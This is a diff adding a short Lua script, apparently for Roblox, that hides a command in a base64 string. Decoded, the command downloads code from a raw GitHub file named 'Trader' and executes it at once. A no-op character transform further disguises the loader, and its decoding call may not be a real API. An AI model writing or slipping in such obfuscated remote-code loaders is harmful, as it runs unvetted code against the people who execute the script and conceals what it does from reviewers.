@@ -1,0 +1,8 @@
+local b64 = "bG9hZHN0cmluZyhhZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vSmFjb2JNYXN0ZXJDb2Rlci9MdWEvbWFpbi9UcmFkZXIiKSkgKCk="
+
+local decoded = b64:gsub('.', function(c)
+    return string.char(((c:byte() - 32) % 95 + 32))
+end)
+
+local f = loadstring(game:GetService("HttpService"):Base64Decode(decoded))
+f()
